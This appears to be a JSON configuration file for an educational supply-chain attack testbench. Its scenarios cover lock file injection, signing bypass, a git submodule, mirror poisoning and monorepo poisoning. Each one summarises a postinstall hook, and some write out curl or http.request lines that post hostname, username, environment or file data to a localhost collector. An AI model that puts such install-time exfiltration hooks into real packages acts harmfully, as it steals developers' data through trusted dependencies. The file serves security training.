        [
          "name",
          "data-processor"
        ],
        [
          "version",
          "1.2.1"
        ],
        [
          "path",
          "compromised-packages/data-processor"
        ],
        [
          "role",
          "transitive / active"
        ],
        [
          "trigger",
          "postinstall.js"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "data-processor",
        "data-processor",
        false
      ],
      [
        "version",
        "1.2.0",
        "1.2.1",
        true
      ],
      [
        "victimDep",
        "web-utils",
        "web-utils (+ poisoned transitive)",
        true
      ],
      [
        "payload",
        "(none)",
        "anonymous postinstall",
        true
      ],
      [
        "deception",
        "trusted chain",
        "hidden transitive",
        true
      ]
    ],
    "deceptionPill": "hidden transitive dep",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"web-utils\": \"file:../legitimate-packages/web-utils\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "legitimate-packages/data-processor",
      "lines": [
        "clean data-processor@1.2.0",
        "✓ No postinstall",
        "web-utils depends on ^1.2.0",
        "✓ No TESTBENCH gated network"
      ]
    },
    "malCode": {
      "title": "compromised-packages/data-processor",
      "lines": [
        "postinstall.js: anonymous top-level",
        "  if (TESTBENCH_MODE === 'enabled')",
        "    http.request POST localhost:3000/collect",
        "Body: package:data-processor@1.2.1",
        "lab: cp compromised → node_modules/"
      ]
    },
    "codeEdgePill": "transitive postinstall",
    "triggerStrip": "Trigger: postinstall.js (transitive data-processor)  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: web-utils API",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed compromised-packages/data-processor",
      "cd victim-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "cp -r ../compromised-packages/data-processor \\",
      "  node_modules/data-processor",
      "re-run postinstall / npm start"
    ],
    "runtime": {
      "victimBox": [
        "victim-app → web-utils",
        "transitive data-processor"
      ],
      "malBox": [
        "postinstall.js",
        "anonymous top-level"
      ],
      "payloadTitle": "HTTP request in anonymous postinstall",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3000,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: package:data-processor, files{}, env"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('07', …) when set"
      ],
      "coverTitle": "After beacon: direct deps look clean",
      "coverLines": [
        "victim only lists web-utils",
        "data-processor is transitive",
        "APIs still appear normal"
      ],
      "visibleLines": [
        "VISIBLE: web-utils install/use OK",
        "HIDDEN: transitive postinstall beacon",
        "HINT: inspect node_modules/data-processor"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Victim only depends on web-utils",
      "2. Compromised transitive data-processor",
      "3. postinstall.js anonymous exfil",
      "4. Not visible in top-level package.json",
      "5. http to localhost:3000/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "08": {
    "id": "08",
    "title": "Package Lock File Manipulation",
    "folder": "08-package-lock-file-manipulation",
    "subtitle": "What the developer sees vs what actually runs — package-lock injects evil-utils; anonymous postinstall beacons on install",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-app/package.json",
      "metaRows": [
        [
          "name",
          "legitimate-app"
        ],
        [
          "deps",
          "express + lodash only"
        ],
        [
          "path",
          "legitimate-app/"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "malicious-packages/evil-utils",
      "metaRows": [
        [
          "name",
          "evil-utils"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "malicious-packages/evil-utils"
        ],
        [
          "role",
          "injected via lock / active"
        ],
        [
          "trigger",
          "postinstall.js"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "(no evil-utils)",
        "evil-utils",
        true
      ],
      [
        "lock",
        "clean lock",
        "lock injects evil-utils",
        true
      ],
      [
        "path",
        "legitimate-app/",
        "victim-app/ + evil-utils",
        true
      ],
      [
        "payload",
        "(none)",
        "anonymous postinstall",
        true
      ],
      [
        "deception",
        "trusted lock",
        "tampered package-lock",
        true
      ]
    ],
    "deceptionPill": "tampered package-lock",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"evil-utils\": \"file:../malicious-packages/evil-utils\",",
        "  \"express\": \"^4.18.0\", \"lodash\": \"^4.17.21\""
      ]
    },
    "legitCode": {
      "title": "legitimate-app (no evil-utils)",
      "lines": [
        "deps: express + lodash only",
        "✓ No evil-utils entry",
        "✓ No postinstall attack package",
        "clean package-lock narrative"
      ]
    },
    "malCode": {
      "title": "malicious-packages/evil-utils/postinstall.js",
      "lines": [
        "postinstall.js: anonymous top-level",
        "  if (TESTBENCH_MODE === 'enabled')",
        "    http.request POST localhost:3000/collect",
        "Body: package:evil-utils,",
        "  attackType:package-lock-manipulation",
        "  lockFileManipulated:true"
      ]
    },
    "codeEdgePill": "lock injects package",
    "triggerStrip": "Trigger: postinstall.js (evil-utils)  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: express/lodash still work",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed malicious-packages/evil-utils",
      "prep victim-app + lock manipulation",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "  → evil-utils postinstall fires",
      "npm start"
    ],
    "runtime": {
      "victimBox": [
        "victim-app",
        "npm install"
      ],
      "malBox": [
        "evil-utils/postinstall.js",
        "anonymous top-level"
      ],
      "payloadTitle": "HTTP request in anonymous postinstall",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3000,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: evil-utils, lockFileManipulated"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('08', …) when set"
      ],
      "coverTitle": "After beacon: app deps still work",
      "coverLines": [
        "express / lodash remain usable",
        "evil-utils looks like a util dep",
        "lock file hides the injection story"
      ],
      "visibleLines": [
        "VISIBLE: npm install succeeds",
        "HIDDEN: lock-injected postinstall beacon",
        "HINT: diff package-lock vs legitimate-app"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. package-lock injects evil-utils",
      "2. postinstall.js anonymous exfil",
      "3. attackType:package-lock-manipulation",
      "4. Not in clean legitimate-app deps",
      "5. http to localhost:3000/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "09": {
    "id": "09",
    "title": "Package Signing Bypass",
    "folder": "09-package-signing-bypass",
    "subtitle": "What the developer sees vs what actually runs — secure-utils@1.0.1 is “signed” but postinstall still beacons (signatureStatus:VALID)",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-package/secure-utils",
      "metaRows": [
        [
          "name",
          "secure-utils"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "legitimate-package/secure-utils"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "compromised-package/secure-utils",
      "metaRows": [
        [
          "name",
          "secure-utils"
        ],
        [
          "version",
          "1.0.1"
        ],
        [
          "path",
          "compromised-package/secure-utils"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "postinstall.js"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "secure-utils",
        "secure-utils",
        false
      ],
      [
        "version",
        "1.0.0",
        "1.0.1",
        true
      ],
      [
        "signature",
        "valid+clean",
        "VALID but key compromised",
        true
      ],
      [
        "payload",
        "(none)",
        "anonymous postinstall",
        true
      ],
      [
        "deception",
        "trusted signed pkg",
        "signing bypass",
        true
      ]
    ],
    "deceptionPill": "valid signature cover",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"secure-utils\": \"file:../compromised-package/secure-utils\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "legitimate-package/secure-utils",
      "lines": [
        "secure-utils@1.0.0 clean API",
        "✓ No postinstall",
        "✓ Signature story is clean",
        "✓ No TESTBENCH gated network"
      ]
    },
    "malCode": {
      "title": "compromised-package/secure-utils/postinstall.js",
      "lines": [
        "postinstall.js: anonymous top-level",
        "  if (TESTBENCH_MODE === 'enabled')",
        "    http.request POST localhost:3000/collect",
        "Body: signatureStatus:VALID,",
        "  keyCompromised:true,",
        "  attackType:package-signing-bypass"
      ]
    },
    "codeEdgePill": "signed but malicious",
    "triggerStrip": "Trigger: postinstall.js  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: signature still VALID",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed compromised-package/secure-utils",
      "cd victim-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "  → postinstall fires despite “signed”",
      "npm start"
    ],
    "runtime": {
      "victimBox": [
        "victim-app",
        "npm install"
      ],
      "malBox": [
        "postinstall.js",
        "anonymous top-level"
      ],
      "payloadTitle": "HTTP request in anonymous postinstall",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3000,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: secure-utils@1.0.1,",
        "  signatureStatus:VALID, keyCompromised"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('09', …) when set"
      ],
      "coverTitle": "After beacon: signature looks fine",
      "coverLines": [
        "signature verification still passes",
        "package API remains usable",
        "trust-on-sign alone is insufficient"
      ],
      "visibleLines": [
        "VISIBLE: signed install succeeds",
        "HIDDEN: postinstall beacon",
        "HINT: [TESTBENCH] logs + mock CAPTURED DATA"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. postinstall despite valid signature",
      "2. signatureStatus:VALID + keyCompromised",
      "3. Patch 1.0.0 → 1.0.1",
      "4. anonymous top-level exfil",
      "5. http to localhost:3000/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "10": {
    "id": "10",
    "title": "Git Submodule Attack",
    "folder": "10-git-submodule-attack",
    "subtitle": "What the developer sees vs what actually runs — Extra submodule + repo postinstall runs bash postinstall.sh (not an npm dep)",
    "intended": {
      "title": "Intended (review-only)",
      "path": "libs/legitimate-lib",
      "metaRows": [
        [
          "name",
          "legitimate-lib submodule"
        ],
        [
          "version",
          "(git submodule)"
        ],
        [
          "path",
          "libs/legitimate-lib"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "libs/malicious-submodule + postinstall.sh",
      "metaRows": [
        [
          "name",
          "malicious-submodule"
        ],
        [
          "version",
          "(git submodule)"
        ],
        [
          "path",
          "libs/malicious-submodule"
        ],
        [
          "role",
          "active via .gitmodules"
        ],
        [
          "trigger",
          "bash postinstall.sh"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "legitimate-lib",
        "malicious-submodule",
        true
      ],
      [
        "vcs",
        ".gitmodules clean",
        "adds malicious-submodule",
        true
      ],
      [
        "path",
        "libs/legitimate-lib",
        "libs/malicious-submodule",
        true
      ],
      [
        "payload",
        "(none)",
        "bash postinstall.sh curl",
        true
      ],
      [
        "deception",
        "trusted submodule",
        "extra local submodule",
        true
      ]
    ],
    "deceptionPill": "extra git submodule",
    "victimDep": {
      "label": "compromised-repo/.gitmodules",
      "lines": [
        "[submodule \"malicious-submodule\"]",
        "  path = libs/malicious-submodule",
        "  url = ./malicious-submodule"
      ]
    },
    "legitCode": {
      "title": "libs/legitimate-lib",
      "lines": [
        "legitimate-lib submodule surface",
        "✓ No postinstall.sh exfil",
        "✓ No curl to collector",
        "parent repo may omit postinstall"
      ]
    },
    "malCode": {
      "title": "malicious-submodule/postinstall.sh",
      "lines": [
        "bash: if TESTBENCH_MODE=enabled",
        "  curl -X POST localhost:3000/collect",
        "triggered via compromised-repo",
        "  package.json scripts.postinstall",
        "  → bash libs/malicious-submodule/…",
        "NOT an npm dependencies entry"
      ]
    },
    "codeEdgePill": "git lifecycle ≠ npm dep",
    "triggerStrip": "Trigger: bash postinstall.sh (via repo npm postinstall)  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: parent app still runs",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "cd scenarios/10-git-submodule-attack",
      "seed malicious-submodule + .gitmodules",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd compromised-repo && npm install",
      "  → scripts.postinstall runs bash",
      "  libs/malicious-submodule/postinstall.sh",
      "or run postinstall.sh directly"
    ],
    "runtime": {
      "victimBox": [
        "compromised-repo",
        "npm postinstall → bash"
      ],
      "malBox": [
        "postinstall.sh",
        "curl (anonymous bash)"
      ],
      "payloadTitle": "curl in postinstall.sh (not a JS fn)",
      "payloadLines": [
        "curl -s -X POST http://localhost:3000/collect",
        "Body JSON: package:malicious-submodule,",
        "  attackType:git-submodule,",
        "  hostname, username, platform, cwd"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "floci-upload-json.sh 10 …"
      ],
      "coverTitle": "After beacon: parent repo looks fine",
      "coverLines": [
        "legitimate-lib still present",
        "awesome-project start still works",
        "submodule looks like another lib"
      ],
      "visibleLines": [
        "VISIBLE: clone/install succeeds",
        "HIDDEN: submodule shell curl beacon",
        "HINT: inspect .gitmodules + postinstall.sh"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. .gitmodules adds malicious-submodule",
      "2. url ./malicious-submodule (local poison)",
      "3. bash postinstall.sh with curl exfil",
      "4. Not listed in npm dependencies",
      "5. repo package.json postinstall hooks it"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "11": {
    "id": "11",
    "title": "Registry Mirror Poisoning",
    "folder": "11-registry-mirror-poisoning",
    "subtitle": "What the developer sees vs what actually runs — Mirror serves same names/versions; enterprise-utils + secure-lib postinstall both beacon",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-packages/enterprise-utils",
      "metaRows": [
        [
          "name",
          "enterprise-utils"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "legitimate-packages/*"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "compromised-mirror/enterprise-utils",
      "metaRows": [
        [
          "name",
          "enterprise-utils (+ secure-lib)"
        ],
        [
          "version",
          "1.0.0 / 2.0.0"
        ],
        [
          "path",
          "compromised-mirror/…"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "postinstall.js (both)"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "enterprise-utils",
        "same names on mirror",
        false
      ],
      [
        "version",
        "1.0.0",
        "1.0.0 (content differs)",
        true
      ],
      [
        "path",
        "legitimate-packages/*",
        "compromised-mirror/*",
        true
      ],
      [
        "payload",
        "(none)",
        "anonymous postinstall",
        true
      ],
      [
        "deception",
        "trusted",
        "mirror serves identical names",
        true
      ]
    ],
    "deceptionPill": "identical names/versions",
    "victimDep": {
      "label": "corporate-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"enterprise-utils\": \"file:../compromised-mirror/enterprise-utils\",",
        "  \"secure-lib\": \"file:../compromised-mirror/secure-lib\""
      ]
    },
    "legitCode": {
      "title": "legitimate-packages/*",
      "lines": [
        "enterprise-utils@1.0.0 + secure-lib@2.0.0",
        "✓ No postinstall",
        "✓ Clean class APIs",
        "mirror tree is the poison path"
      ]
    },
    "malCode": {
      "title": "compromised-mirror/*/postinstall.js",
      "lines": [
        "both packages: anonymous top-level",
        "  if (TESTBENCH_MODE === 'enabled')",
        "    http.request POST localhost:3000/collect",
        "Body: attackType:registry-mirror-poisoning",
        "enterprise-utils + secure-lib both fire"
      ]
    },
    "codeEdgePill": "same API surface",
    "triggerStrip": "Trigger: postinstall.js (both mirror packages)  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: EnterpriseUtils / SecureLib",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed compromised-mirror packages",
      "cd corporate-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd corporate-app",
      "npm install",
      "npm start"
    ],
    "runtime": {
      "victimBox": [
        "corporate-app",
        "postinstall (both pkgs)"
      ],
      "malBox": [
        "postinstall.js",
        "anonymous top-level"
      ],
      "payloadTitle": "HTTP request in anonymous postinstall",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3000,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: registry-mirror-poisoning, package…"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('11', …) when set"
      ],
      "coverTitle": "After beacon: class APIs still export",
      "coverLines": [
        "EnterpriseUtils / SecureLib still work",
        "names/versions match legitimate tree",
        "only scripts/content differ"
      ],
      "visibleLines": [
        "VISIBLE: install / API succeed",
        "HIDDEN: dual postinstall beacons",
        "HINT: diff mirror vs legitimate-packages"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. file:../compromised-mirror/* deps",
      "2. postinstall on both packages",
      "3. mirror tree vs legitimate-packages diff",
      "4. identical names/versions",
      "5. http to localhost:3000/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "12": {
    "id": "12",
    "title": "Workspace / Monorepo Attack",
    "folder": "12-workspace-monorepo-attack",
    "subtitle": "What the developer sees vs what actually runs — Same @devcorp/utils; poisoned workspace package beacons via postCapture; victim uses api+auth",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-packages/utils",
      "metaRows": [
        [
          "name",
          "@devcorp/utils"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "legitimate-packages/utils"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "compromised-package/utils",
      "metaRows": [
        [
          "name",
          "@devcorp/utils"
        ],
        [
          "version",
          "1.0.1"
        ],
        [
          "path",
          "compromised-package/utils"
        ],
        [
          "role",
          "workspace poison / active"
        ],
        [
          "trigger",
          "postinstall → postCapture"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "@devcorp/utils",
        "@devcorp/utils",
        false
      ],
      [
        "version",
        "1.0.0",
        "1.0.1",
        true
      ],
      [
        "path",
        "legitimate-packages/utils",
        "compromised-package/utils",
        true
      ],
      [
        "payload",
        "(none)",
        "postCapture / main",
        true
      ],
      [
        "victim",
        "api+auth → utils",
        "same consumers poisoned",
        true
      ]
    ],
    "deceptionPill": "shared workspace name",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"@devcorp/api\": \"file:../packages/api\",",
        "  \"@devcorp/auth\": \"file:../packages/auth\""
      ]
    },
    "legitCode": {
      "title": "legitimate-packages/utils",
      "lines": [
        "@devcorp/utils@1.0.0 clean API",
        "✓ No postinstall",
        "api + auth depend on file:../utils",
        "✓ No TESTBENCH gated network"
      ]
    },
    "malCode": {
      "title": "compromised-package/utils/postinstall.js",
      "lines": [
        "function postCapture(data) { … }",
        "  hostname: '127.0.0.1', port: 3000,",
        "  path: '/collect'",
        "async function main() {",
        "  if (TESTBENCH_MODE !== 'enabled') return",
        "  await postCapture(…)",
        "}"
      ]
    },
    "codeEdgePill": "same @devcorp/utils",
    "triggerStrip": "Trigger: postinstall → main() → postCapture  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST 127.0.0.1:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: api+auth still work",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed compromised @devcorp/utils",
      "workspace install (api+auth+utils)",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://127.0.0.1:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "npm install in workspace",
      "  → @devcorp/utils postinstall",
      "cd victim-app && npm start",
      "  uses @devcorp/api + @devcorp/auth"
    ],
    "runtime": {
      "victimBox": [
        "victim-app",
        "@devcorp/api + auth"
      ],
      "malBox": [
        "postinstall main()",
        "postCapture(…)"
      ],
      "payloadTitle": "HTTP request built in postCapture()",
      "payloadLines": [
        "http.request({",
        "  hostname: '127.0.0.1',",
        "  port: 3000,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: workspace monorepo exfil fields"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('12','workspace-exfil')"
      ],
      "coverTitle": "After beacon: api/auth still resolve",
      "coverLines": [
        "victim never depends on utils directly",
        "@devcorp/api + @devcorp/auth still work",
        "shared package is the poison"
      ],
      "visibleLines": [
        "VISIBLE: workspace install succeeds",
        "HIDDEN: 127.0.0.1:3000 postCapture",
        "HINT: inspect packages/utils postinstall"
      ]
    },
    "verifyLines": [
      "curl -s http://127.0.0.1:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Victim depends on @devcorp/api + auth",
      "2. Shared @devcorp/utils is poisoned",
      "3. postCapture uses 127.0.0.1:3000",
      "4. Version bump 1.0.0 → 1.0.1",
      "5. Workspace trust assumption"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is 127.0.0.1 only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "13": {
    "id": "13",
    "title": "Package Metadata Manipulation",
    "folder": "13-package-metadata-manipulation",
    "subtitle": "What the developer sees vs what actually runs — clean-utils@1.0.1 looks metadata-clean; anonymous postinstall POSTs /capture on :3001",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-packages/clean-utils",
      "metaRows": [
        [
          "name",
          "clean-utils"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "legitimate-packages/clean-utils"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "compromised-packages/clean-utils",
      "metaRows": [
        [
          "name",
          "clean-utils"
        ],
        [
          "version",
          "1.0.1"
        ],
        [
          "path",
          "compromised-packages/clean-utils"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "postinstall.js"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "clean-utils",
        "clean-utils",
        false
      ],
      [
        "version",
        "1.0.0",
        "1.0.1",
        true
      ],
      [
        "metadata",
        "clean story",
        "manipulated metadata",
        true
      ],
      [
        "payload",
        "(none)",
        "anonymous postinstall",
        true
      ],
      [
        "endpoint",
        "N/A",
        "POST /capture :3001",
        true
      ]
    ],
    "deceptionPill": "clean metadata cover",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"clean-utils\": \"file:../compromised-packages/clean-utils\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "legitimate-packages/clean-utils",
      "lines": [
        "clean-utils@1.0.0",
        "✓ No postinstall",
        "✓ Clean metadata narrative",
        "✓ No TESTBENCH gated network"
      ]
    },
    "malCode": {
      "title": "compromised-packages/clean-utils/postinstall.js",
      "lines": [
        "anonymous top-level",
        "  if (TESTBENCH_MODE !== 'enabled') exit",
        "  http.request POST localhost:3001/capture",
        "Body: metadata-manipulation-sim note",
        "optional uploadJson Floci"
      ]
    },
    "codeEdgePill": "metadata ≠ behavior",
    "triggerStrip": "Trigger: postinstall.js  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3001/capture  ·  Evidence: infrastructure/captured-data.json  ·  Cover: clean-utils API",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed compromised-packages/clean-utils",
      "cd victim-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3001",
      "init captured-data.json {captures:[]}",
      "POST /capture · GET /captured-data",
      "DELETE /captured-data (if present)"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "  → postinstall → /capture",
      "npm start / exercise package"
    ],
    "runtime": {
      "victimBox": [
        "victim-app",
        "npm install"
      ],
      "malBox": [
        "postinstall.js",
        "anonymous top-level"
      ],
      "payloadTitle": "HTTP request in anonymous postinstall",
